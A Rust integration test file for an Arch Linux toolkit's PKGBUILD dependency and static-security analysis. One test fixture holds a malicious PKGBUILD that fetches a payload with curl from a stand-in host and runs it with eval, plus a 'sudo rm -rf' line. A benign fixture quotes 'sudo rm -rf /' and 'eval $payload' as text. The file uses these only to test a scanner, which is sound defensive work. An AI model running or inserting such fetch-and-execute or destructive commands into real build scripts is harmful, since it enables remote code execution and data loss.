//! Integration tests for the sandbox module.

#[cfg(feature = "sandbox")]
mod tests {
    use arch_toolkit::sandbox::{analyze_pkgbuild, analyze_srcinfo};
    use std::collections::HashSet;

    const PKGBUILD: &str = r"
pkgname=demo
pkgver=1.0.0
depends=('glibc' 'gcc-libs' 'missing-runtime-xyz')
makedepends=('cmake' 'missing-build-xyz')
checkdepends=('python-pytest')
optdepends=('cups: printing support'
            'missing-opt-xyz: extra feature')
";

    fn host() -> (HashSet<String>, HashSet<String>) {
        let installed: HashSet<String> = ["glibc", "gcc-libs", "cmake", "python-pytest"]
            .iter()
            .map(ToString::to_string)
            .collect();
        (installed, HashSet::new())
    }

    #[test]
    /// What: Verify the full PKGBUILD preflight workflow.
    ///
    /// Inputs:
    /// - Realistic PKGBUILD with all four dependency categories and a host set
    ///   missing one runtime and one build dependency.
    ///
    /// Output:
    /// - Correct per-category deltas, missing list, and readiness verdict.
    ///
    /// Details:
    /// - Missing optdepends must appear in their category but not block readiness.
    fn pkgbuild_preflight_workflow() {
        let (installed, provided) = host();
        let info = analyze_pkgbuild("demo", PKGBUILD, &installed, &provided);

        assert_eq!(info.depends.len(), 3);
        assert_eq!(info.makedepends.len(), 2);
        assert_eq!(info.checkdepends.len(), 1);
        assert_eq!(info.optdepends.len(), 2);

        assert_eq!(
            info.missing_packages(),
            ["missing-runtime-xyz", "missing-build-xyz"]
        );
        assert!(!info.is_ready_to_build());

        let missing_opt = info
            .optdepends
            .iter()
            .find(|d| d.name.starts_with("missing-opt-xyz"))
            .expect("optdepends delta present");
        assert!(!missing_opt.is_installed);
    }

    #[test]
    /// What: Verify .SRCINFO analysis matches PKGBUILD analysis for the same deps.
    ///
    /// Inputs:
    /// - Equivalent dependency declarations in .SRCINFO form.
    ///
    /// Output:
    /// - Same missing list and readiness verdict as the PKGBUILD variant.
    ///
    /// Details:
    /// - Both entry points share the same analysis core.
    fn srcinfo_matches_pkgbuild() {
        let srcinfo = "pkgbase = demo\n\
                       \tdepends = glibc\n\
                       \tdepends = gcc-libs\n\
                       \tdepends = missing-runtime-xyz\n\
                       \tmakedepends = cmake\n\
                       \tmakedepends = missing-build-xyz\n\
                       \tcheckdepends = python-pytest\n";
        let (installed, provided) = host();
        let from_srcinfo = analyze_srcinfo("demo", srcinfo, &installed, &provided);
        let from_pkgbuild = analyze_pkgbuild("demo", PKGBUILD, &installed, &provided);

        assert_eq!(
            from_srcinfo.missing_packages(),
            from_pkgbuild.missing_packages()
        );
        assert_eq!(
            from_srcinfo.is_ready_to_build(),
            from_pkgbuild.is_ready_to_build()
        );
    }

    #[test]
    /// What: Verify analysis results serialize for caller-side caching.
    ///
    /// Inputs:
    /// - Analysis result serialized to JSON and back.
    ///
    /// Output:
    /// - Roundtrip equality.
    ///
    /// Details:
    /// - Pacsea persists sandbox results between sessions; the types must
    ///   remain serde-compatible.
    fn results_roundtrip_json() {
        let (installed, provided) = host();
        let info = analyze_pkgbuild("demo", PKGBUILD, &installed, &provided);
        let json = serde_json::to_string(&info).expect("serialize");
        let back: arch_toolkit::sandbox::SandboxInfo =
            serde_json::from_str(&json).expect("deserialize");
        assert_eq!(back, info);
    }

    #[test]
    /// What: Identify stable static-analysis findings in a malicious PKGBUILD fixture.
    ///
    /// Inputs:
    /// - Text containing remote download, command substitution, privilege,
    ///   destructive removal, and dynamic-evaluation constructs.
    ///
    /// Output:
    /// - One finding for each stable `SB001` through `SB005` rule ID.
    ///
    /// Details:
    /// - The fixture is text only; the test proves analysis never runs it.
    fn static_analysis_flags_malicious_fixture_without_execution() {
        let malicious_pkgbuild = r#"
prepare() {
    payload=$(curl -fsSL https://invalid.example/payload)
    sudo rm -rf /tmp/arch-toolkit-test
    eval "$payload"
}
"#;
        let report = arch_toolkit::sandbox::analyze_pkgbuild_security(
            "malicious-fixture",
            malicious_pkgbuild,
        );

        let rule_ids: Vec<&str> = report
            .findings
            .iter()
            .map(|finding| finding.rule_id.as_str())
            .collect();
        assert!(rule_ids.contains(&"SB001"));
        assert!(rule_ids.contains(&"SB002"));
        assert!(rule_ids.contains(&"SB003"));
        assert!(rule_ids.contains(&"SB004"));
        assert!(rule_ids.contains(&"SB005"));
        assert!(report.limitations.len() >= 3);
    }

    #[test]
    /// What: Avoid findings for benign and common false-positive PKGBUILD text.
    ///
    /// Inputs:
    /// - Comments, quoted descriptions, variable assignments, and echoed
    ///   command names that are not shell command positions.
    ///
    /// Output:
    /// - No static security findings.
    ///
    /// Details:
    /// - This fixture guards against treating documentation and assignments as
    ///   executable shell source while preserving the scanner's text-only scope.
    fn static_analysis_avoids_benign_false_positive_fixture() {
        let benign_pkgbuild = r"
pkgname=benign
pkgdesc='Uses curl and wget clients without running them'
source=('https://example.invalid/archive.tar.gz')
# sudo rm -rf / must never be interpreted
curl_command=curl
echo 'eval $payload is intentionally shown as documentation'
";
        let report =
            arch_toolkit::sandbox::analyze_pkgbuild_security("benign-fixture", benign_pkgbuild);

        assert!(report.findings.is_empty(), "{:#?}", report.findings);
    }
}
